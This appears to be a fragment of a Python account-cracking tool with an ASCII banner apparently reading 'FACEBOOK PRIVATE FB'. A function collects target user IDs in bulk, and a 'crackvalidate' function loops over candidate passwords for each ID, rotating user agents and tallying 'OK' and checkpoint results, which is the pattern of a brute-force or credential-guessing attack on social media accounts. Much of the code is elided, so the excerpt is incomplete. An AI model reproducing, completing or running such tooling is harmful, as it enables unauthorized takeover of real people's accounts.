...
╠╣ ╠═╣║  ║╣ ╠╩╗║ ║║ ║╠╩╗  ║ ║║
╚  ╩ ╩╚═╝╚═╝╚═╝╚═╝╚═╝╩ ╩  ╩═╩╝
___  ____ _ _  _ ____ ___ ____ ____ ___  
|__] |__/ | |  | |__|  |  |___ |___ |__] 
|    |  \ |  \/  |  |  |  |___ |    |__] 
...
def dump_massal():    
	try:
	    ...
	    exit()
	try:
		kumpulkan = int(input(f'\x1b[0mMau Berapa Id Target : '))
	except ValueError:
	    exit()
	...
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'\x1b[0mMasukkan Id Yang Ke  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
...
def crackvalidate(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white][validate] {H2}[{idf}]{P2} {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
